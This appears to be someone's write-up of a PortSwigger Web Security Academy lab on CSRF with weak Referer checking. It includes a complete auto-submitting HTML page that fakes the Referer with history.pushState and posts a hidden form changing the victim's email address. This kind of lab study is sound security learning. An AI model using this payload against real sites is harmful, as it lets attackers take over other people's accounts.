Lab #12:  CSRF with broken Referer validation



Target:  changes the victim's email address

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.

Analysis:


   There is a csrf vulnerability in change email and no csrf token is provided.

   CSRF prevention is through the referer http header. 

    - setting no referrer in html code results in invalid referrer error:
       <meta name="referrer" content="no-referrer">

    - but when we add some prefix to the referrer value using burpsuit, it accepts it. 
    so the serever look for the site name somewhere in the referrer string:

    Referer: https://attacker web site. myPOrtSwiggerID.web-security-academy.net/my-account/change-email
   


   to change the referrer, add some appendix to the history:

      <html>
        <body>
            <script>history.pushState("", "", "/?myPOrtSwiggerID.web-security-academy.net") </script>

            <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned52@evil-user.net" />
            </form>
            <script>

                document.forms[0].submit();
            </script>
        </body>
    </html>

    also, we need to set Referrer-Policy: unsafe-url in the head section to make sure the added prefix is not removed.
